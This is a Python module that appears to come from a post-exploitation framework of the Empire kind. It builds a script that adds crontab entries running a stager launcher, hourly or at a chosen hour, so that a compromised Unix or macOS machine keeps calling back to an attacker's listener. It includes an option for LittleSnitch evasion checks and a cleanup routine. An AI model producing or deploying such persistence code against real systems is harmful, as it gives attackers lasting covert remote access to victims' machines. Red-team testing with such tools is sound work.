class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Persistence with crontab via Launcher code',

            # list of one or more authors for the module
            'Author': ['@424f424f', '@sleventyeleven'],

            # more verbose multi-line description of the module
            'Description': 'This module establishes persistence via crontab',

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # list of any references/other comments
            'Comments': ['']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to establish a crontab',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Remove' : {
                'Description'   :   'Remove All Persistence. True/False',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Hourly' : {
                'Description'   :   'Hourly persistence.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Hour' : {
                'Description'   :   'Hour to callback. 24hr format.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LittleSnitch' : {
                'Description'   :   'Set for stager LittleSnitch checks.',
                'Required'      :   True,
                'Value'         :   'True'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):
        Remove = self.options['Remove']['Value']
        Hourly = self.options['Hourly']['Value']
        Hour = self.options['Hour']['Value']
        listenerName = self.options['Listener']['Value']
        littleSnitch = self.options['LittleSnitch']['Value']
        userAgent = self.options['Agent']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent,  littlesnitch=littleSnitch)
        launcher = launcher.replace('"', '\\\\"')
        launcher = launcher.replace("'", "\\'")
        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        script = """
import subprocess
import sys
Remove = "%s"
Hourly = "%s"
Hour = "%s"
if Remove == "True":
    cmd = 'crontab -l | grep -v "import sys,base64;exec(base64.b64decode("  | crontab -'
    print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
    print "Finished"
else:
    if Hourly == "True":
        cmd = 'crontab -l | { cat; echo "0 * * * * %s"; } | crontab -'
        print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
        print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
        print "Finished"
    elif Hour:
            cmd = 'crontab -l | { cat; echo "%s * * * * %s"; } | crontab -'
            print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
            print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
            print "Finished"
""" % (Remove, Hourly, Hour, launcher,  Hour, launcher)
        return script
